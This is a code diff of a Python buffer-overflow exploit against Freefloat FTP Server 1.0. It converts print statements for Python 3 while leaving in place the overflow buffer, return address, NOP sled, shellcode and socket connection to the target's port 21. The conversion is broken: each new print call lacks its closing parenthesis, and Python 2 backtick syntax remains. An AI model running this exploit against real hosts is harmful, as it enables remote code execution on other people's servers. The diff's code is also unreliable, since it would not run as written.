@@ -10,9 +10,9 @@
 import socket,sys,time,struct
 
 if len(sys.argv) < 2:
-     print "[-]Usage: %s <target addr> <command>" % sys.argv[0] + "\r"
-     print "[-]For example [filename.py 192.168.1.10 PWND] would do the trick."
-     print "[-]Other options: AUTH, APPE, ALLO, ACCT"
+     print("[-]Usage: %s <target addr> <command>" % sys.argv[0] + "\r"
+     print("[-]For example [filename.py 192.168.1.10 PWND] would do the trick."
+     print("[-]Other options: AUTH, APPE, ALLO, ACCT"
      sys.exit(0)
 
 target = sys.argv[1]
@@ -57,7 +57,7 @@ ret = struct.pack('<L', 0x7C874413)
 padding = "\x90" * 150
 crash = "\x41" * 246 + ret + padding + shellcode
 
-print "\
+print("\
 [*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow\n\
 [*] Author: Craig Freyman (@cd1zz)\n\
 [*] Connecting to "+target
@@ -66,10 +66,10 @@ s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 try:
     s.connect((target,21))
 except:
-    print "[-] Connection to "+target+" failed!"
+    print("[-] Connection to "+target+" failed!"
     sys.exit(0)
 
-print "[*] Sending " + `len(crash)` + " " + command +" byte crash..."
+print("[*] Sending " + `len(crash)` + " " + command +" byte crash..."
 
 s.send("USER anonymous\r\n")
 s.recv(1024)
